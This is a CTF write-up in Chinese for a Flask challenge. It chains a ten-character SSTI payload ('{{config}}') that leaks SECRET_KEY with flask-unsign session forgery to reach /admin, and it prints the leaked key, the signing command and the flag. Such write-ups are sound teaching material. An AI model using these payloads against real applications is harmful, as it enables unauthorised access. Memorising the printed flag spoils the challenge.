# week3fake_session

## 题目简述

Flask 应用把用户身份保存在客户端签名 Session Cookie 中。首页的“计算器”会把不超过 10 个字符、且不符合算式正则的输入直接交给 `render_template_string`，形成 SSTI；`/admin` 则要求 Session 同时满足 `user == 'admin'` 和 `id == '0'`。利用 SSTI 泄露 `SECRET_KEY` 后即可伪造管理员 Session。

## 解题过程

正常访问首页得到的 Session 解码后是：

```python
{"id": "flag in /admin", "user": "nobody"}
```

提交表单参数 `formula={{config}}`。该字符串恰好为 10 个字符，不会触发长度限制，又不以数字算式开头，因此最终进入 Jinja 模板渲染。响应中的 Flask 配置泄露：

```text
SECRET_KEY = 4hf3j8sgh(rt&%^jf*dw
```

用该密钥签名新的客户端 Session。注意源码把 `id` 与字符串 `'0'` 比较，因此必须保留字符串类型；原 PDF 中写成整数 `0` 会导致严格条件不成立。

```bash
flask-unsign --sign \
  --cookie "{'user': 'admin', 'id': '0'}" \
  --secret '4hf3j8sgh(rt&%^jf*dw'
```

把命令输出设置为浏览器的 `session` Cookie 后直接访问 `/admin`。不要再经过 `/`，因为首页每次请求都会把 `user` 和 `id` 重置为普通用户。最终返回：

```text
0xGame{fake_sessi0n_but_t3ue_f1ag}
```

## 方法总结

本题利用链是“短输入 SSTI泄密 → Flask Session 伪造 → 越权访问”。Flask 的默认 Session 是签名而非加密，客户端本来就能读取内容；安全性完全依赖服务端密钥无法被获知。一旦 SSTI 暴露 `SECRET_KEY`，攻击者就能生成任意合法身份。复现时还要严格匹配源码中的数据类型，并避免访问会覆盖伪造 Session 的路由。
